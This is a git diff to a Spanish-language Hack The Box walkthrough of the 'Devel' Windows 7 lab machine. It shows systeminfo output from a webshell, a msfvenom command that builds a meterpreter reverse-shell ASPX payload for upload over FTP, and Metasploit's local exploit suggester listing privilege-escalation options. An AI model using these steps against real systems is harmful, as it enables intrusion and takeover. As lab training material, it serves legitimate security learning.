@@ -88,4 +88,73 @@ Ya tenemos shell en la máquina
 18/03/2017  02:06 §£    <DIR>          Classic .NET AppPool
 14/07/2009  10:20 §£    <DIR>          Public
 ```
-No tenemos acceso a ninguno pero sabemos que los usuarios con flag son babis y Administrator
+No tenemos acceso a ninguno pero sabemos que los usuarios con flag son babis y Administrator ya que el actual no tiene acceso a ninguna flag
+
+#### Versiones y hotfixes
+
+Ejecutamos el comando systeminfo aún desde la webshell
+```
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ££
+System Boot Time:          1/8/2020, 1:44:56 ££
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 652 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.503 MB
+Virtual Memory: In Use:    544 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+```
+De aquí sacamos que tenemos un windows 7 de 32 bits y sin parchear
+
+#### Convirtiendo la web shell en reverse shell
+Generamos una Rev Shell con msfvenom
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx  > shell.aspx
+```
+Subimos la revshell al FTP y nos conectamos a ella aprovechando que la hemos generado con msfvenom vamos a usar el exploit sugester de metasploit para poder encontrar una manera de elevar privilegios en la máquina
+```
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+```
+Veamos si alguno se puede hacer de manera cómoda
+
+
